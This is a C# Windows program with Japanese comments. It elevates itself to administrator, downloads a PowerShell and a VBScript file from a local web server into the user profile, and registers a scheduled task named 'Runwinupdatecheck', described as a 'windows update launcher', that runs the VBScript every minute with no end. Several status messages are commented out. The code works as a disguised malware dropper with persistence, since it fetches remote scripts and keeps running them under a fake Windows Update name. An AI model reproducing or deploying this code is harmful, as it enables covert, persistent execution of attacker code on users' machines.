using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32.TaskScheduler;

class Program
{
    static void Main(string[] args)
    {
        // 管理者権限のチェック
        if (!IsAdministrator())
        {
            RestartAsAdmin();
            return;
        }

        Console.WriteLine("管理者権限で実行中...");

        // ダウンロードURL
        string ps1Url = "http://localhost:8000/download/a.ps1"; // a.ps1ファイルのURL
        string vbsUrl = "http://localhost:8000/download/a.vbs"; // a.vbsファイルのURL

        // ユーザーフォルダ内に保存するディレクトリ
        string userFolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string folderPath = Path.Combine(userFolder, "MyDownloadedFiles");

        // フォルダ作成
        if (!Directory.Exists(folderPath))
        {
            Directory.CreateDirectory(folderPath);
           // Console.WriteLine($"フォルダを作成しました: {folderPath}");
        }

        // ファイルパスの設定
        string ps1FilePath = Path.Combine(folderPath, "a.ps1");
        string vbsFilePath = Path.Combine(folderPath, "a.vbs");

        // PS1ファイルをダウンロード
        DownloadFile(ps1Url, ps1FilePath);

        // VBSファイルをダウンロード
        DownloadFile(vbsUrl, vbsFilePath);

        // タスクスケジューラに登録（VBSファイルを実行するタスク）
        RegisterTask(vbsFilePath);
    }

    static bool IsAdministrator()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    static void RestartAsAdmin()
    {
        try
        {
            ProcessStartInfo proc = new ProcessStartInfo
            {
                UseShellExecute = true,
                FileName = Application.ExecutablePath, // 実行中のプログラムパス
                Verb = "runas" // 管理者権限で実行
            };

            Process.Start(proc);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"管理者として再実行に失敗しました: {ex.Message}");
        }
    }

    static void DownloadFile(string url, string filePath)
    {
        using (WebClient client = new WebClient())
        {
            try
            {
                client.DownloadFile(url, filePath);
             //   Console.WriteLine($"ファイルをダウンロードしました: {filePath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ファイルダウンロード中にエラーが発生しました: {ex.Message}");
            }
        }
    }

    static void RegisterTask(string filePath)
    {
        using (TaskService ts = new TaskService())
        {
            // タスク名
            string taskName = "Runwinupdatecheck";

            // 既存タスクを削除（あれば）
            Task existingTask = ts.FindTask(taskName);
            if (existingTask != null)
            {
                ts.RootFolder.DeleteTask(taskName);
                Console.WriteLine("既存のタスクを削除しました。");
            }

            // 新しいタスクを作成
            TaskDefinition td = ts.NewTask();
            td.RegistrationInfo.Description = "windows update launcher";

            // トリガーを追加
            var timeTrigger = new TimeTrigger
            {
                StartBoundary = DateTime.Now.AddMinutes(1), // 1分後に開始
            };

            // 繰り返し間隔を設定（1分ごとに繰り返す）
            timeTrigger.Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero);
            // DurationにTimeSpan.Zeroを設定することで無期限になる

            td.Triggers.Add(timeTrigger);

            // VBSを実行するアクションを追加
            td.Actions.Add(new ExecAction("wscript.exe", $"\"{filePath}\"", null));

            // タスクを登録
            try
            {
                ts.RootFolder.RegisterTaskDefinition(taskName, td);
               // Console.WriteLine("タスクを登録しました。");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"タスク登録中にエラーが発生しました: {ex.Message}");
            }
        }
    }


}
